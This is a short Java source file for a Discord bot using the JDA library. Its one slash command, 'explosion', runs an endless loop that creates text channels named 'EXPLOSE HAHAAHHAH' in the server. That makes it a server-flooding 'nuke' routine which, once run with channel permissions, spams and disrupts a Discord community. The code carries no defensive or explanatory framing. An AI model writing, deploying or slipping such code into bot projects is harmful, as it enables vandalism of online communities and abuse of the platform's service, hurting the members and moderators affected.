package org.botdiscord.commands;

import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;

public class Explosion extends ListenerAdapter {
    @Override
    public void onSlashCommandInteraction(@NotNull SlashCommandInteractionEvent event){
        if(!event.getName().equals("explosion")){ //one word, all lower case
            return;
        }
        while(true){
            event.getGuild().createTextChannel("EXPLOSE HAHAAHHAH").queue();
        }
    }
}
